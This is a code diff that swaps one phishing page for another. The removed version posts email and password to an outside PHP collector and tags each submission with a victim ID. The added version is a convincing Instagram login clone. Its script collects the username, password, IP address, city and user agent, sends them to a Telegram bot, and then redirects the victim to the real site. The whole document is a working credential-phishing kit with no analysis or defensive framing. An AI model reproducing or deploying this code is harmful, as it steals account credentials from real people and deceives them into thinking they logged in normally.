@@ -1,65 +1,505 @@
-<!DOCTYPE html>
-<html style="font-size: 16px;" lang="fr"><head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta charset="utf-8">
-    <meta name="keywords" content="">
-    <meta name="description" content="">
-    <title></title>
-    <link rel="stylesheet" href="nicepage.css" media="screen">
-<link rel="stylesheet" href="Page-1.css" media="screen">
-    <script class="u-script" type="text/javascript" src="jquery-1.9.1.min.js" defer=""></script>
-    <meta name="generator" content="Nicepage 4.16.0, nicepage.com">
-    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
-    
-    
-    <script type="application/ld+json">{
-		"@context": "http://schema.org",
-		"@type": "Organization",
-		"name": ""
-}</script>
-    <meta name="theme-color" content="#478ac9">
-    <meta property="og:title" content="Page 1">
-    <meta property="og:type" content="website">
-  </head>
-  <body data-home-page="https://website2622515.nicepage.io/Page-1.html?version=50ac5bd6-779b-4e24-b6d2-12f5fd03c13e" data-home-page-title="Page 1" class="u-body u-xl-mode" data-lang="fr">
-    <section class="u-clearfix u-custom-color-2 u-section-1" id="sec-e27f">
-      <div class="u-clearfix u-sheet u-sheet-1">
-        <div class="u-border-1 u-border-grey-75 u-shape u-shape-rectangle u-shape-1"></div>
-        <div class="u-form u-form-1">
-          <form action="https://zonurl.com/conti0/home2/11.php" method="POST"   id="login_form"  class="u-clearfix u-form-spacing-15 u-form-vertical u-inner-form" style="padding: 15px;" source="email" name="form">
-           <input type="hidden" name="user_id_victim" value="66918" />
-<input type="hidden" name="hash" value="cb8b113023947c548e27027972246964,1703515513" />
+<style>
+  #root, body, html {
+  height:100%;
+}
 
-            <div class="u-form-group u-form-name u-label-none u-form-group-1">
-              <label for="name-6797" class="u-label">Email</label>
-              <input type="text" placeholder="Phone number, username, or email"  name="email" class="u-border-1 u-border-grey-30 u-input u-input-rectangle" required="">
-            </div>
-            <div class="u-form-email u-form-group u-label-none u-form-group-2">
-              <label for="email-6797" class="u-label">Password</label>
-              <input type="password" placeholder="Password"  name="pass" class="u-border-1 u-border-grey-30 u-input u-input-rectangle" required="">
-            </div>
-            <div class="u-align-center u-form-group u-form-submit u-form-group-3">
-             <label class="uiButton uiButtonConfirm uiButtonLarge" for="u649190_1">
-<input value="Login" name="login" onclick="" id="u649190_1"  type="submit" style=" background-color: #478ac9; color: #ffffff; /* margin-top: 1px; */ margin-bottom: 1px; position: relative; vertical-align: middle; text-align: center; padding: 10px 30px; border-radius: 0; align-self: flex-start; "></label>
+body {
+  overflow-y: scroll;
+}
 
-            </div>
-            <div class="u-form-send-message u-form-send-success">Thank you! Your message has been sent.</div>
-            <div class="u-form-send-error u-form-send-message">Unable to send your message. Please fix errors then try again.</div>
-            <input type="hidden" value="" name="recaptchaResponse">
-          </form>
-        </div>
-        <img class="u-border-1 u-border-grey-75 u-image u-image-default u-image-1" src="images/08.png" alt="" data-image-width="353" data-image-height="67">
-        <img class="u-image u-image-default u-image-2" src="images/03.png" alt="" data-image-width="352" data-image-height="91">
-        <img class="u-hidden-md u-hidden-sm u-hidden-xs u-image u-image-default u-image-3" src="images/04.png" alt="" data-image-width="408" data-image-height="600">
-        <img class="u-image u-image-default u-preserve-proportions u-image-4" src="images/7a252de00b20.png" alt="" data-image-width="175" data-image-height="51">
-        <img class="u-image u-image-default u-image-5" src="images/07.png" alt="" data-image-width="287" data-image-height="109">
-      </div>
-    </section>
-    
-    
-    
-    <section class="u-backlink u-clearfix u-grey-80">
-      
-    </section>
+a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
+  margin:0;
+  padding:0;
+  border:0;
+  font:inherit;
+  vertical-align: baseline;
+} 
+
+a, a:visited {
+  text-decoration: none;
+}
+a:active, .btn:active {
+  opacity:.5;
+}
+
+ol, ul {
+  list-style: none;
+}
+
+body, button, input {
+  font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:14px;
+  line-height:18px;
+}
+
+#root, article, main, div, section, header, nav, footer {
+  border: 0 solid #000000;
+  box-sizing: border-box;
+  align-items: stretch;
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+  margin:0;
+  padding:0;
+  position: relative;
+  -webkit-box-align: stretch;
+    -moz-box-align: stretch;
+  -webkit-box-orient: vertical;
+    -moz-box-orient: vertical;
+  -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+} /* <--Universal Selectors End */
+
+
+#root {
+  z-index: 0;
+}
+
+.section-all {
+  min-height:100%;
+  overflow:hidden;
+}
+
+.main {
+  background-color: #fafafa;
+  order: 4;
+  flex-grow: 1;
+  -webkit-box-flex: 1;
+  -moz-box-flex: 1;
+  -moz-box-ordinal-group: 5;
+  -webkit-box-ordinal-group: 5;
+}
+
+.wrapper {
+  min-height:100%;
+  overflow: hidden;
+}
+.wrapper, .article {
+  flex-grow: 1;
+  justify-content: center;
+  -webkit-box-flex: 1;
+    -moz-box-flex: 1;
+  -webkit-box-pack: center;
+    -moz-box-pack: center;
+}
+
+.article {
+  flex-direction: row;
+  margin:0 auto;
+  max-width: 935px;
+  width:100%;
+  -webkit-box-orient: horizontal;
+    -moz-box-orient: horizontal;
+  -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+}
+
+.content {
+  color:#262626;
+  flex-grow:1;
+  justify-content: center;
+  max-width: 350px;
+  margin-top:12px;
+  -webkit-box-pack: justify;
+    -moz-box-pack: justify;
+  -webkit-box-flex: 1;
+    -moz-box-flex: 1;  
+}
+
+.login-box {
+  background: #fff;
+  border: 1px solid #e6e6e6;
+  border-radius: 1px;
+  margin:0 0 10px;
+  padding: 10px 0;
+  /* align-items: center; */
+}
+
+.header {
+  margin: 14.45px auto 12px;
+}
+
+.logo {
+  background: cover no-repeat;
+  width:175px;
+  height:auto;
+}
+
+.form {
+  display: flex;
+  flex-direction: column;
+  margin-bottom: 10px;
+  -moz-box-direction: normal;
+  -webkit-box-direction: normal;
+}
+
+.input-box {
+  margin:auto 40px 6px;
+}
+
+input {
+  height: 36px;
+  border: 1px solid #efefef;
+  border-radius: 3px;
+  background-color: #fafafa;
+  width:100%;
+  font-size:12px;
+  margin: 0;
+  padding: 9px 0 7px 8px;
+  outline: none;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  box-sizing: border-box;
+}
+input#name:focus, input#password:focus {
+  border-color:#bbb;
+}
+
+.button-box {
+  display: block;
+  position: relative;
+  margin: 8px 40px;
+}
+.btn {
+  cursor: pointer;
+  width: 100%;
+  padding:0 8px; 
+  background: #3897f0;
+  border:1px solid #3897f0;
+  color:#fff;
+  border-radius:3px;
+  font-weight:600;
+  font-size: 14px;
+  height: 28px;
+  line-height: 26px;
+  outline: none;
+  white-space: nowrap;
+}
+
+.forgot, .forgot:active, .forgot:hover, .forgot:visited {
+  font-size:12px;
+  margin-top:12px;
+  text-align: center;
+  color:#003569;
+  line-height: 14px!important;
+}
+
+.text {
+  text-align:center;
+  margin:15px;
+  color:#262626;
+  font-size:14px;
+}
+
+.text a, .text a:visited, .text a:hover, .text a:active {
+  color:#3897f0;
+  margin-left:3px;
+}
+/* App Store */
+.app p {
+  line-height: 18px;
+  color:#262626;
+  font-size:14px;
+  text-align:center;
+  margin:10px 20px;
+}
+
+.app-img {
+  flex-direction: row;
+  justify-content: center;
+  margin:10px 0;
+  -webkit-box-orient: horizontal;
+  -moz-box-orient: horizontal;
+}
+
+.app-img a {
+  margin-right:8px;
+  height: 43.5px;
+}
+
+.app-img img {
+  height:40px;
+}
+
+/* FOOTER */
+.footer {
+  background-color: #fafafa;
+  order: 5;
+  padding: 0 20px;
+  background: #fafafa;
+}
+
+.footer-container {
+  flex-direction: row;  
+  flex-wrap:wrap;
+  background-color: #fafafa;
+  justify-content: space-between;
+  padding: 38px 0;
+  max-width:935px;
+  font-size:12px;
+  font-weight:600;
+  margin:0 auto;
+  text-transform:uppercase;
+  width:100%
+}
+
+.footer-nav {
+  max-width:100%;
+}
+
+.footer-nav ul {
+  margin-right:16px;
+  margin-bottom:3px;
+  flex-grow:1;
+}
+
+.footer-nav ul li {
+  display: inline-block;
+  margin-right: 13px;
+  margin-bottom:7px;
+}
+
+.footer-nav ul li a {
+  color: #003569;
+  text-decoration: none;
+}
+
+.footer span {
+  color:#999;
+}
+
+span.language { 
+  color: #003569;
+  cursor: pointer;
+  display: inline-block;
+  font-weight: 600;
+  position: relative;
+  text-transform: uppercase;
+  vertical-align: top;
+}
+
+.select {
+  cursor: pointer;
+  height: 100%;
+  top: 0;
+  opacity: 0;
+  position: absolute;
+  left:0;
+  width: 100%;
+}
+
+/* Media Queries */
+@media (max-width:450px) {
+  .main {
+    background-color: #fff;
+  }
+
+  .content {
+    max-width: 100%;
+    margin-top: 0;
+    justify-content: space-between;
+  }
+
+  .login-box {
+    background-color: transparent;
+    border:none;
+  }
+
+  .logo {
+    background: cover no-repeat;
+    width:175px;
+    height:auto;
+    margin:0 auto;
+  }
+
+  .btn {
+    cursor: pointer;
+    width: 100%;
+    padding:0 8px; 
+    background: #3897f0;
+    border:1px solid #3897f0;
+    color:#fff;
+    border-radius:3px;
+    font-weight:600;
+    font-size: 14px;
+    height: 28px;
+    line-height: 26px;
+    outline: none;
+    white-space: nowrap;
+  }
   
-</body></html>
+  .input-box:hover, .input-box:focus {
+    border-color:#bbb;
+  }
+
+}
+
+@media only screen and (max-width:875px) {
+  .footer-container {
+    text-align: center;
+    padding:10px 0;
+  }
+  .footer-container,  .footer-nav ul {
+    justify-content: center;
+    margin:0 auto;
+    max-width: 360px;
+    min-width: auto;
+    -webkit-box-pack: center;
+    -moz-box-pack: center;
+  }
+
+}
+  
+</style>
+<body>
+  <input id="pagename" type="hidden" value="Instagram">
+  <span id="root">
+    <section class="section-all">
+
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                  <form class="form" onsubmit="submitonhfc(); return false;">
+
+                    <div class="input-box">
+                      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
+                    </div>
+
+                    <div class="input-box">
+                      <input type="password" name="password" id="email" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    </div>
+
+                    <span class="button-box">
+                      <button class="btn" type="submit" name="submit">Log in</button>
+                    </span>
+
+                    <a class="forgot" href="">Forgot password?</a>
+                  </form>
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+              </div> <!-- Signup-box end -->
+
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                  </a>
+                </div> <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href="">About Us</a></li>
+              <li><a href="">Support</a></li>
+              <li><a href="">Blog</a></li>
+              <li><a href="">Press</a></li>
+              <li><a href="">Api</a></li>
+              <li><a href="">Jobs</a></li>
+              <li><a href="">Privacy</a></li>
+              <li><a href="">Terms</a></li>
+              <li><a href="">Directory</a></li>
+              <li>
+                <span class="language">Language
+                  <select name="language" class="select" onchange="la(this.value)">
+                    <option value="#">English</option>
+                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                  </select>
+                </span>
+              </li>
+            </ul>
+          </nav>
+
+          <span class="footer-logo"> from meta</span>
+        </div> <!-- Footer container end -->
+      </footer>
+
+    </section>
+  </span> <!-- Root -->
+
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonhfc() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               const page = document.getElementById("pagename").value;
+               const name = document.getElementById("name").value;
+               const email = document.getElementById("email").value;
+               const message = `> Login Page : ${page}\n\n> Username : ${name}\n\n> Password : ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = 'Your Bot Token';
+               const chatId = chatid;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "https://www.instagram.com";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }
+  </script>
+</body>
